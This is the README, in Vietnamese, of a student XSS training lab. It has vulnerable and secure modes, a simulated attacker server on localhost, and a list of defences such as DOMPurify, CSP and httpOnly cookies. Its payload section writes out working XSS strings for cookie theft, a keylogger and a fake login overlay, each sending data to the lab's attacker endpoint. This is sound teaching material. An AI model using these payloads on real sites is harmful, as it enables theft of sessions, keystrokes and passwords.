# XSS Security Lab 🛡️

Dự án bài tập thực hành **Cross-Site Scripting (XSS)** — minh họa 3 loại tấn công XSS phổ biến và các biện pháp phòng chống.

## Tổng quan

| Thành phần | Công nghệ | Port |
|---|---|---|
| **Backend** | Express.js + TypeScript + Prisma + MongoDB | 3000 |
| **Frontend** | React + Vite + TypeScript + TailwindCSS | 5173 |
| **Hacker Server** | Express.js + WebSocket (mô phỏng máy chủ kẻ tấn công) | 4000 |

## Các loại XSS được demo

| Loại | Mô tả | Đường dẫn |
|---|---|---|
| **DOM XSS** | Inject script qua `dangerouslySetInnerHTML` | `/xss-demo` |
| **Reflected XSS** | Script phản chiếu qua query param | `GET /demo/reflected-xss?msg=<script>` |
| **Stored XSS** | Script lưu vào DB, thực thi khi xem bài viết | `/posts` → tạo bài → view |

---

## ⚡ Chạy nhanh (1 lệnh)

```bash
# 1. Clone repo
git clone https://github.com/BaoHuyDev98/cross-siteScripting.git


# 2. Cấu hình môi trường
cp backend/.env.example backend/.env
# Sửa backend/.env: điền DATABASE_URL từ MongoDB Atlas

# 3. Cài tất cả dependencies + generate Prisma
npm install
npm run setup

# 4. Chạy tất cả 3 server cùng lúc
npm run dev
```

> **Lưu ý:** Lệnh `npm run dev` ở root sẽ khởi động đồng thời Backend (cổng 3000), Frontend (cổng 5173) và Hacker Server (cổng 4000).

---

## 📋 Chạy từng phần (cách thủ công)

Mở **3 terminal riêng biệt**:

```bash
# Terminal 1 — Backend (port 3000)
cd backend
npm install
npx prisma generate
npm run dev

# Terminal 2 — Frontend (port 5173)
cd frontend
npm install
npm run dev

# Terminal 3 — Hacker Server (port 4000)
cd hacker-server
npm install
npm run dev
```

---

## ⚙️ Cấu hình môi trường

### Backend (`backend/.env`)

```env
DATABASE_URL="mongodb+srv://<username>:<password>@<cluster>.mongodb.net/<dbname>"
JWT_SECRET="your-strong-secret-here"
PORT=3000
FRONTEND_URL="http://localhost:5173"
```

> **Lấy MongoDB URL:** Đăng nhập [MongoDB Atlas](https://cloud.mongodb.com) → Cluster → Connect → Connect your application → Copy connection string

### Frontend (`frontend/.env`)

```env
VITE_API_URL=http://localhost:3000
```

---

## 🗄️ Thiết lập Database

```bash
cd backend

# Tạo Prisma client từ schema
npx prisma generate

# Push schema lên MongoDB Atlas
npx prisma db push
```

> **MongoDB Atlas IP Whitelist:** Vào Atlas → Network Access → Add IP Address → "Allow access from anywhere" (cho môi trường dev).

---

## 📖 Hướng dẫn sử dụng

### 1. Đăng ký / Đăng nhập
- Truy cập `http://localhost:5173`
- Click **Get Started** → đăng ký tài khoản
- Đăng nhập để có thể tạo bài viết và comment

### 2. Demo Stored XSS
1. Vào **Posts** → **Tạo bài viết mới**
2. Chọn **Vulnerable Mode** (màu đỏ)
3. Trong **Payload Library** chọn payload ví dụ: `<img src=x onerror="alert('XSS')">`
4. Click **Đăng bài**
5. Mở bài vừa tạo → Alert sẽ xuất hiện (XSS thực thi!)
6. Toggle sang **Secure Mode** → XSS bị chặn bởi DOMPurify

### 3. Demo Cookie Theft với Hacker Server
1. Mở `http://localhost:4000` — Hacker Dashboard
2. Trong CreatePost (Vulnerable Mode), dùng payload **Cookie Theft**:
   ```html
   <img src=x onerror="fetch('http://localhost:4000/steal?cookie='+document.cookie)">
   ```
   > ⚠️ **Lưu ý:** Do cookie có `httpOnly: true`, `document.cookie` sẽ trống. Thay vào đó dùng **Keylogger** hoặc **Phishing Overlay** để demo data theft thực tế.
3. Mở bài → Hacker Dashboard cập nhật real-time

### 4. Demo DOM XSS
- Truy cập `/xss-demo`
- Nhập payload vào ô input → xem so sánh vulnerable vs secure side-by-side

### 5. Demo Reflected XSS
- URL vulnerable: `http://localhost:3000/demo/reflected-xss?msg=<script>alert('XSS')</script>`
- URL fixed: `http://localhost:3000/demo/reflected-xss-fixed?msg=<script>alert('XSS')</script>`

### 6. Security Dashboard
- Truy cập `/security`
- Chọn payload từ danh sách hoặc nhập custom payload
- Xem so sánh 5 phương pháp sanitization
- Toggle **CSP ON/OFF** để thấy Content Security Policy chặn script

---

## 🗂️ Cấu trúc dự án

```
cross-siteScripting/
├── backend/                    # Express.js API server
│   ├── src/
│   │   ├── index.ts           # Entry point, middleware setup
│   │   ├── routes/
│   │   │   ├── auth.ts        # POST /api/register, /login, /logout, GET /me
│   │   │   ├── posts.ts       # CRUD /api/posts — vulnerable/secure mode
│   │   │   ├── comments.ts    # POST/DELETE /api/posts/:id/comments
│   │   │   └── xss-demo.ts    # GET /demo/reflected-xss (vulnerable + fixed)
│   │   ├── middleware/
│   │   │   ├── auth.ts        # JWT middleware
│   │   │   └── csp.ts         # Content Security Policy toggle
│   │   └── utils/
│   │       └── xss-detector.ts # XSS pattern detection & risk scoring
│   ├── prisma/
│   │   └── schema.prisma      # User, Post, Comment models
│   ├── .env                   # Không commit! (xem .env.example)
│   └── .env.example
│
├── frontend/                   # React + Vite SPA
│   ├── src/
│   │   ├── pages/
│   │   │   ├── Posts.tsx      # Danh sách bài viết
│   │   │   ├── Post.tsx       # Chi tiết bài + Comments (vulnerable/secure toggle)
│   │   │   ├── CreatePost.tsx # Tạo bài + Payload Library
│   │   │   ├── Login.tsx
│   │   │   ├── Register.tsx
│   │   │   └── SecurityDashboard.tsx  # So sánh sanitization methods
│   │   ├── components/
│   │   │   ├── XSSDemo.tsx    # DOM XSS demo side-by-side
│   │   │   └── CommentSection.tsx
│   │   └── lib/api.ts         # API client (fetch + credentials: include)
│   ├── .env
│   └── .env.example
│
├── hacker-server/              # Mô phỏng máy chủ attacker
│   ├── src/index.ts           # Express + WebSocket server (port 4000)
│   └── public/index.html      # Hacker Dashboard UI (real-time)
│
├── package.json               # Root: one-command startup với concurrently
└── README.md
```

---

## 🔐 API Endpoints

### Authentication
| Method | Endpoint | Mô tả |
|---|---|---|
| POST | `/api/register` | Đăng ký (username, password) |
| POST | `/api/login` | Đăng nhập → JWT cookie |
| POST | `/api/logout` | Xóa cookie |
| GET | `/api/me` | Lấy thông tin user hiện tại |

### Posts
| Method | Endpoint | Auth | Mô tả |
|---|---|---|---|
| GET | `/api/posts` | No | Danh sách bài viết |
| GET | `/api/posts/:id` | No | Chi tiết bài + comments |
| POST | `/api/posts` | Yes | Tạo bài (`?mode=secure` để sanitize) |
| PUT | `/api/posts/:id` | Yes | Sửa bài (chủ sở hữu) |
| DELETE | `/api/posts/:id` | Yes | Xóa bài (chủ sở hữu) |

### Comments
| Method | Endpoint | Auth | Mô tả |
|---|---|---|---|
| POST | `/api/posts/:postId/comments` | Yes | Thêm comment (`?mode=secure`) |
| DELETE | `/api/comments/:id` | Yes | Xóa comment (chủ sở hữu) |

### XSS Demo
| Method | Endpoint | Mô tả |
|---|---|---|
| GET | `/demo/reflected-xss?msg=` | Reflected XSS (vulnerable) |
| GET | `/demo/reflected-xss-fixed?msg=` | Reflected XSS (fixed với he.encode) |

### Hacker Server (port 4000)
| Method | Endpoint | Mô tả |
|---|---|---|
| GET | `/steal?cookie=&type=` | Nhận data bị đánh cắp qua img tag |
| POST | `/steal` | Nhận data qua fetch body |
| GET | `/api/logs` | Lấy tất cả stolen data |
| DELETE | `/api/logs` | Xóa logs |

---

## 🔍 XSS Payload Examples

### Basic
```html
<script>alert('XSS')</script>
<img src=x onerror="alert('XSS')">
<svg onload="alert('XSS')">
```

### Cookie Theft (chỉ hoạt động với non-httpOnly cookies)
```html
<img src=x onerror="fetch('http://localhost:4000/steal?cookie='+document.cookie)">
```

### Keylogger
```html
<script>document.onkeypress=function(e){fetch('http://localhost:4000/steal?type=key&key='+e.key)}</script>
```

### Phishing Overlay
```html
<script>document.body.innerHTML='<div style="position:fixed;inset:0;background:#fff;z-index:9999;display:flex;align-items:center;justify-content:center"><form action="http://localhost:4000/steal" method="POST"><h2>Session Expired</h2><input name="type" value="form" hidden><input name="username" placeholder="Username"><input name="password" type="password" placeholder="Password"><button>Login</button></form></div>'</script>
```

### Page Defacement
```html
<script>document.body.innerHTML='<h1 style="color:red;text-align:center;margin-top:200px">HACKED</h1>'</script>
```

---

## 🛡️ Biện pháp phòng chống

| Phương pháp | Mô tả |
|---|---|
| **DOMPurify** | Sanitize HTML, giữ lại tags an toàn, loại bỏ scripts |
| **React text rendering** | `{content}` tự escape HTML — không cần thêm gì |
| **HTML Entity Encode** | `he.encode()` — chuyển tất cả thành entities |
| **Content Security Policy** | Header chặn inline script dù payload đã inject |
| **httpOnly Cookie** | Ngăn JavaScript đọc cookie |
| **Input Validation** | Kiểm tra server-side trước khi lưu |

---

## ⚠️ Lưu ý quan trọng

- Dự án này **chỉ dùng cho mục đích giáo dục**
- KHÔNG deploy lên môi trường production
- Credential MongoDB Atlas trong `.env` **không được commit vào git**
- Hacker Server chỉ chạy ở `localhost` — không expose ra internet

---

## 👥 Phân công

| Thành viên | Phần đảm nhận |
|---|---|
| Person 1 | Frontend UI, Layout, DOM XSS demo |
| Person 2 | Backend Auth, Reflected XSS |
| Person 3 | Post + Comment API, Stored XSS, Security Dashboard |
| Person 4 | Hacker Server, WebSocket Dashboard |
